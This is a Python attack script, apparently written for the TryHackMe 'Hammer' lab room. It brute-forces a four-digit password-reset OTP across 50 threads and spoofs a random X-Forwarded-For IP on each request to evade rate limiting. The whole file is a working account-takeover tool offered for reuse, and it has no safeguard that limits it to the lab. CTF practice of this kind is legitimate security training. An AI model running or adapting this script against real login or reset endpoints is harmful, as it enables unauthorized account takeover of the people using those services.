"""
This script is meant for TryHackme's 'Hammer' room.
Feel free to modify it.
"""

import requests
import threading
import random
import sys

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <target_ip> <cookie>")
    sys.exit(1)

url = f"http://{sys.argv[1]}:1337/reset_password.php"
current_cookie = f"{sys.argv[2]}"
num_threads = 50

# Event to signal threads to stop
stop_threads = threading.Event()

def SendOTP(start, end):
    for OTP in range(start, end):
        rand_ip1 = str(random.randint(1, 254))
        rand_ip2 = str(random.randint(1, 254))
        rand_ip3 = str(random.randint(1, 254))
        rand_ip4 = str(random.randint(1, 254))
        OTPheaders = {
            "X-Forwarded-For" : f"{rand_ip1}.{rand_ip2}.{rand_ip3}.{rand_ip4}",
            "Cookie" : f"PHPSESSID={current_cookie}",
            "Content-Type" : "application/x-www-form-urlencoded"
        }

        # Format OTP as zero-padded 4-digit string
        otp_str = f"{OTP:04d}"
        data = {
            "recovery_code" : otp_str,
            "s" : "180"
        }

        try:
            response = requests.post(url, headers=OTPheaders, data=data, allow_redirects=False)
            if stop_threads.is_set():
                return
            
            elif "Invalid" in response.text:
                pass

            else:
                stop_threads.set()
                print(f"[+]Found OTP: {otp_str}")

        except requests.exceptions.RequestException as e:
            pass
        

#-------------------------Where the function is executed-------------------------

# Create and start threads
threads = []

otp_range = 10000  # total OTPs from 0000 to 9999
chunk_size = otp_range // num_threads

ranges = [(i * chunk_size, (i + 1) * chunk_size) for i in range(num_threads)]

# Handle any leftover OTPs if otp_range is not divisible by num_threads
if otp_range % num_threads != 0:
    ranges[-1] = (ranges[-1][0], otp_range)

for start, end in ranges:
    thread = threading.Thread(target=SendOTP, args=(start, end))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()

print("[*] Finished all threads.")
